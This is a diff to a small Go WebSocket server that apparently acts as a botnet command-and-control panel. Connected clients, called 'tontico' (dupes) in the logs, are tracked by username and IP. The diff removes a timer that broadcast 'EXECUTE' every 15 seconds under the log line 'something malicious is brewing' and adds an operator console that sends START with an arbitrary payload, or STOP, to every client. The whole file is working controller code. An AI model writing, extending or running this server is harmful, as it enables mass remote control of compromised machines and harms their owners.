@@ -1,9 +1,11 @@
 package main
 
 import (
-	"encoding/json"
+	"bufio"
+	"fmt"
 	"log"
 	"net/http"
+	"os"
 	"sync"
 	"time"
 
@@ -33,15 +35,12 @@ var (
 func wsHandler(w http.ResponseWriter, r *http.Request) {
 	conn, err := upgrader.Upgrade(w, r, nil)
 	if err != nil {
-		log.Println("Upgrade error:", err)
 		return
 	}
-
 	defer conn.Close()
 
 	var info ClientInfo
 	if err := conn.ReadJSON(&info); err != nil {
-		log.Println("Read JSON error:", err)
 		return
 	}
 	info.Connected = time.Now()
@@ -50,25 +49,28 @@ func wsHandler(w http.ResponseWriter, r *http.Request) {
 	clients[conn] = Client{Conn: conn, Info: info}
 	clientsMu.Unlock()
 
-	log.Printf("🟢🟢 tontico conectao: %+v\n", info)
+	log.Println("🟢 - tontin conectao:", info.Username, info.IP)
 
 	for {
 		if _, _, err := conn.ReadMessage(); err != nil {
 			clientsMu.Lock()
 			delete(clients, conn)
 			clientsMu.Unlock()
-			log.Println("🔴🔴 tontico se fue:", info.Username)
 			break
 		}
 	}
 }
 
-func broadcastExecute() {
+func broadcast(action, payload string) {
 	clientsMu.Lock()
 	defer clientsMu.Unlock()
 
 	msg := map[string]string{
-		"action": "EXECUTE",
+		"action": action,
+	}
+
+	if payload != "" {
+		msg["payload"] = payload
 	}
 
 	for conn := range clients {
@@ -76,31 +78,36 @@ func broadcastExecute() {
 	}
 }
 
-func activeClientsJSON() []byte {
-	clientsMu.Lock()
-	defer clientsMu.Unlock()
+func consoleLoop() {
+	reader := bufio.NewReader(os.Stdin)
 
-	list := []ClientInfo{}
-	for _, c := range clients {
-		list = append(list, c.Info)
+	for {
+		fmt.Print("\n[s] START  [x] STOP  [q] SALIR > ")
+		cmd, _ := reader.ReadString('\n')
+
+		switch cmd[0] {
+		case 's':
+			fmt.Print("payload: ")
+			payload, _ := reader.ReadString('\n')
+			payload = payload[:len(payload)-1]
+
+			broadcast("START", payload)
+			fmt.Println("START enviado")
+
+		case 'x':
+			broadcast("STOP", "")
+			fmt.Println("STOP enviado")
+
+		case 'q':
+			os.Exit(0)
+		}
 	}
-
-	data, _ := json.MarshalIndent(list, "", "  ")
-	return data
 }
 
 func main() {
 	http.HandleFunc("/ws", wsHandler)
+	go consoleLoop()
 
-	go func() {
-		for {
-			time.Sleep(15 * time.Second)
-			log.Println("something malicious is brewing")
-			broadcastExecute()
-			log.Println("tonticos en linea:", string(activeClientsJSON()))
-		}
-	}()
-
-	log.Println("Servidor WS en :8080")
+	log.Println("scatter :8080")
 	log.Fatal(http.ListenAndServe(":8080", nil))
 }
